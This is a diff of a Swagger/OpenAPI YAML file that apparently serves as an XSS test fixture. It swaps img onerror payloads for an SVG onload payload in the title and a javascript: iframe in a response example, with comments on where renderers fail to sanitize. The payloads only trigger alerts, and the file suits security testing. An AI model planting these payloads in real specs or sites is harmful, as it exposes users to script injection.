@@ -1,19 +1,24 @@
 swagger: '2.0'
 info: 
-  title: Swagger DOM XSS
-  description: TestXSS
+  # Titles are often rendered directly inside <h1> or <a> tags.
+  # Let's try an SVG payload, as they sometimes bypass naive sanitizers.
+  title: Test Title <svg/onload=alert('XSS-in-Title')>
+  description: A safe description.
   version: production
 basePath: /
-security:
-  - basicAuth: []
 paths:
-  '/xss.html':
+  '/test':
     get:
-      parameters:
-        - description: XSS
-          type: string
-          in: \"><img src=x onerror=alert(document.domain)>
-          default: \"><img src=x onerror=prompt(document.domain)>
+      summary: A test endpoint
       responses:
         '200':
-          description: No response was specified
+          description: OK
+          schema:
+            type: object
+            properties:
+              id:
+                type: string
+                # Example values are another common place for XSS.
+                # When you click "Execute", the response body is often
+                # rendered. If the example is used, it might not be sanitized.
+                example: '"><iframe src="javascript:alert(`XSS-in-Example`)"></iframe>'
